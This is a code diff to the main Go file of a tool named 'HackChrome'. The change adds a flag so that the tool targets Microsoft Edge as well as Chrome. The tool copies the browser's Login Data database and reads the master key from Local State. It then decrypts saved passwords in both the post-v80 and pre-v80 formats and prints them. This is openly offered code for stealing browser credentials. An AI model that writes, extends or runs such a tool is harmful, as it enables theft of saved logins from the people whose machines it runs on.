@@ -3,34 +3,49 @@ package main
 import (
 	"HackChrome/core"
 	"HackChrome/utils"
+	"flag"
 	"fmt"
 	_ "github.com/mattn/go-sqlite3"
 	"os"
+	"path/filepath"
 )
 
+var isEdge bool
 
-func main(){
-	key_file := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
-	orig_pwd_db := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/default/Login Data"
-	pwd_db := "LocalDB"
+func init() {
+	flag.BoolVar(&isEdge, "edge", false, "true or false, default is false and chrome is used.")
+}
 
-	utils.CopyFile(orig_pwd_db, pwd_db)
+func main() {
+	flag.Parse()
+	var browserDirPath string
+	if isEdge {
+		browserDirPath = "Microsoft/Edge"
+	} else {
+		browserDirPath = "Google/Chrome"
+	}
 
-	master_key, err := core.GetMaster(key_file)
-	if err != nil{
+	keyFile := filepath.Join(os.Getenv("USERPROFILE"), "AppData/Local", browserDirPath, "User Data/Local State")
+	origPwdDb := filepath.Join(os.Getenv("USERPROFILE"), "AppData/Local", browserDirPath, "User Data/Default/Login Data")
+	pwdDb := "LocalDB"
+
+	utils.CopyFile(origPwdDb, pwdDb)
+
+	masterKey, err := core.GetMaster(keyFile)
+	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
 	// chrome > v80
-	chrome_v80_res := core.GetPwd(pwd_db, master_key)
+	chromeV80Res := core.GetPwd(pwdDb, masterKey)
 	// chrome < v80
-	chrome_res := core.GetPwdPre(pwd_db)
+	chromeRes := core.GetPwdPre(pwdDb)
 	// total
-	total_res := utils.Merge(chrome_v80_res, chrome_res)
+	totalRes := utils.Merge(chromeV80Res, chromeRes)
 
-	err = utils.FormatOutput(total_res, pwd_db)
-	if err != nil{
+	err = utils.FormatOutput(totalRes, pwdDb)
+	if err != nil {
 		fmt.Println(err)
 		return
 	}
